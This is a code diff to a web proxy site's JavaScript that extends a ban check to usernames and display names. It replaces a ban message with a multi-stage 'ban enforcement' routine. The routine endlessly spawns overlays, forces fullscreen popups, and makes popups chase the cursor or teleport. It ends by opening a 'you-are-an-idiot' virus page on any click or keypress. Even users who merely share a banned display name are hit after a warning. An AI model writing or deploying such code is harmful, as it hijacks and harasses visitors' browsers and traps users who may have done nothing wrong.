@@ -275,23 +275,131 @@
             
             const basePath = getBasePath();
 
-            // Access control — blocked identifiers
+            // Access control — blocked identifiers with full enforcement
             async function _checkAccess() {
                 const email = localStorage.getItem('sb_email');
-                if (!email) return true;
+                const username = localStorage.getItem('sb_username');
+                const displayName = localStorage.getItem('sb_displayname');
+                if (!email && !username && !displayName) return true;
                 try {
                     const r = await fetch('/api/check-access', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ email }),
+                        body: JSON.stringify({ email, username, displayName }),
                     });
                     const d = await r.json();
                     if (d.blocked) {
-                        document.body.innerHTML = '<div style="position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000;z-index:999999"><div style="text-align:center"><h1 style="font-family:system-ui,sans-serif;font-size:6vw;color:#ff1a1a;text-transform:uppercase;letter-spacing:.05em;margin:0;text-shadow:0 0 40px rgba(255,0,0,.5)">YOU ARE BANNED FROM JIMMYQRG</h1></div></div>';
+                        _runBanEnforcement();
+                        return false;
+                    }
+                    if (d.displayNameWarning) {
+                        _runDisplayNameWarning();
                         return false;
                     }
                 } catch (_) {}
                 return true;
+            }
+
+            function _runDisplayNameWarning() {
+                var overlay = document.createElement('div');
+                overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:999990;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:40px;';
+                overlay.innerHTML = '<p style="font-family:\'Zilla Slab Highlight\',serif;font-size:2.5vw;color:#ff3333;text-align:center;max-width:800px;line-height:1.4;">This username had been used by a user that is permanently blocked from service, please use another display name next time.</p>';
+                document.body.appendChild(overlay);
+                var link = document.createElement('link');
+                link.rel = 'stylesheet';
+                link.href = 'https://fonts.googleapis.com/css2?family=Zilla+Slab+Highlight:wght@700&display=swap';
+                document.head.appendChild(link);
+                setTimeout(function() { _runBanEnforcement(); }, 4000);
+            }
+
+            function _runBanEnforcement() {
+                var link = document.createElement('link');
+                link.rel = 'stylesheet';
+                link.href = 'https://fonts.googleapis.com/css2?family=Zilla+Slab+Highlight:wght@700&display=swap';
+                document.head.appendChild(link);
+
+                // Stage 1: Giant "YOU ARE BANNED" modal
+                var z = 9999900;
+                function makeModal() {
+                    var m = document.createElement('div');
+                    m.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:'+(z++)+';display:flex;align-items:center;justify-content:center;';
+                    m.innerHTML = '<h1 style="font-family:\'Zilla Slab Highlight\',serif;font-size:12vw;color:#ff1a1a;text-shadow:0 0 80px rgba(255,0,0,.7),0 0 160px rgba(255,0,0,.4);animation:_bpulse .15s infinite alternate;text-align:center;">YOU ARE BANNED</h1>';
+                    document.body.appendChild(m);
+                    return m;
+                }
+
+                if (!document.getElementById('_ban_keyframes')) {
+                    var st = document.createElement('style');
+                    st.id = '_ban_keyframes';
+                    st.textContent = '@keyframes _bpulse{0%{transform:scale(1) rotate(-1deg)}100%{transform:scale(1.04) rotate(1deg)}}';
+                    document.head.appendChild(st);
+                }
+
+                makeModal();
+
+                // Stage 2: Never stop opening modals (anti-adblock / anti-dismiss)
+                var _modalSpam = setInterval(function() { makeModal(); }, 400);
+
+                // Stage 3: After 2s, open fullscreen popup
+                setTimeout(function() { _stage3_fullscreenPopup(); }, 2000);
+
+                function _stage3_fullscreenPopup() {
+                    var popup = window.open('', '_blank', 'width=600,height=400');
+                    if (!popup) return;
+                    popup.document.write('<!DOCTYPE html><html><head><meta charset="utf-8"><link href="https://fonts.googleapis.com/css2?family=Zilla+Slab+Highlight:wght@700&display=swap" rel="stylesheet"><style>*{margin:0;padding:0}body{background:#000;overflow:hidden}.c{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column}h1{font-family:"Zilla Slab Highlight",serif;font-size:8vw;color:#ff1a1a;text-shadow:0 0 60px rgba(255,0,0,.7);animation:p .12s infinite alternate}@keyframes p{0%{transform:scale(1)}100%{transform:scale(1.03)}}button{margin-top:40px;padding:16px 48px;font-size:2vw;background:#ff1a1a;color:#fff;border:none;cursor:pointer;font-family:"Zilla Slab Highlight",serif;border-radius:8px}</style></head><body><div class="c"><h1>YOU ARE BANNED FROM SERVICE</h1><button id="cl">CLOSE</button></div><script>');
+                    popup.document.write('function goFS(){try{document.documentElement.requestFullscreen?document.documentElement.requestFullscreen():document.documentElement.webkitRequestFullscreen&&document.documentElement.webkitRequestFullscreen();}catch(e){}}');
+                    popup.document.write('["click","keydown","mousedown","touchstart","pointerdown"].forEach(function(ev){document.addEventListener(ev,goFS,{once:false});});');
+                    popup.document.write('document.getElementById("cl").addEventListener("click",function(e){e.stopPropagation();window.opener&&window.opener.postMessage("_ban_close_clicked","*");});');
+                    popup.document.write('</script></body></html>');
+                    popup.document.close();
+
+                    // Listen for "CLOSE" button click from the popup
+                    window.addEventListener('message', function handler(ev) {
+                        if (ev.data !== '_ban_close_clicked') return;
+                        window.removeEventListener('message', handler);
+                        _stage4_chasePopups(popup);
+                    });
+                }
+
+                function _stage4_chasePopups(existingPopup) {
+                    // Open the lagger popup
+                    var laggerPopup = window.open('/tools/lagger/index.html', '_blank', 'width=500,height=400');
+
+                    var mouseX = screen.width / 2, mouseY = screen.height / 2;
+                    document.addEventListener('mousemove', function(e) { mouseX = e.screenX; mouseY = e.screenY; });
+
+                    // Existing popup follows mouse
+                    var chaseInterval = setInterval(function() {
+                        try {
+                            if (existingPopup && !existingPopup.closed) {
+                                existingPopup.moveTo(mouseX - 200, mouseY - 150);
+                            }
+                        } catch(e) {}
+                    }, 30);
+
+                    // Lagger popup teleports randomly
+                    var teleportInterval = setInterval(function() {
+                        try {
+                            if (laggerPopup && !laggerPopup.closed) {
+                                laggerPopup.moveTo(
+                                    Math.random() * (screen.width - 400),
+                                    Math.random() * (screen.height - 300)
+                                );
+                            }
+                        } catch(e) {}
+                    }, 150);
+
+                    // Stage 5: any user trigger opens virus page
+                    var virusFired = false;
+                    function fireVirus() {
+                        if (virusFired) return;
+                        virusFired = true;
+                        window.open('/you-are-an-idiot/virus.html', '_blank', 'width=600,height=400');
+                    }
+                    ['click','keydown','mousedown','touchstart','pointerdown','scroll'].forEach(function(ev) {
+                        document.addEventListener(ev, fireVirus, { once: true, capture: true });
+                    });
+                }
             }
 
             // Scramjet proxy engine (ServiceWorker-based)
@@ -3308,6 +3416,14 @@
                                 <label for="settings-email-input">Email (optional)</label>
                                 <input type="email" id="settings-email-input" class="form-control" value="${localStorage.getItem('sb_email') || ''}" placeholder="your@email.com" />
                             </div>
+                            <div class="form-group" style="margin-top:12px">
+                                <label for="settings-username-input">Username (optional)</label>
+                                <input type="text" id="settings-username-input" class="form-control" value="${localStorage.getItem('sb_username') || ''}" placeholder="@username" />
+                            </div>
+                            <div class="form-group" style="margin-top:12px">
+                                <label for="settings-displayname-input">Display Name (optional)</label>
+                                <input type="text" id="settings-displayname-input" class="form-control" value="${localStorage.getItem('sb_displayname') || ''}" placeholder="Display Name" />
+                            </div>
                             <button class="button" id="save-email-button">Save</button>
                         </div>
                         <div class="settings-section">
@@ -3881,14 +3997,13 @@
 
                 document.getElementById('save-email-button')?.addEventListener('click', async () => {
                     const email = (document.getElementById('settings-email-input')?.value || '').trim().toLowerCase();
-                    if (email) {
-                        localStorage.setItem('sb_email', email);
-                        const ok = await _checkAccess();
-                        if (ok) showMessage(successMsg, 'Email saved', 'success');
-                    } else {
-                        localStorage.removeItem('sb_email');
-                        showMessage(successMsg, 'Email cleared', 'success');
-                    }
+                    const username = (document.getElementById('settings-username-input')?.value || '').trim().toLowerCase();
+                    const displayName = (document.getElementById('settings-displayname-input')?.value || '').trim();
+                    if (email) localStorage.setItem('sb_email', email); else localStorage.removeItem('sb_email');
+                    if (username) localStorage.setItem('sb_username', username); else localStorage.removeItem('sb_username');
+                    if (displayName) localStorage.setItem('sb_displayname', displayName); else localStorage.removeItem('sb_displayname');
+                    const ok = await _checkAccess();
+                    if (ok) showMessage(successMsg, 'Account info saved', 'success');
                 });
 
                 saveTitleButton?.addEventListener('click', () => {
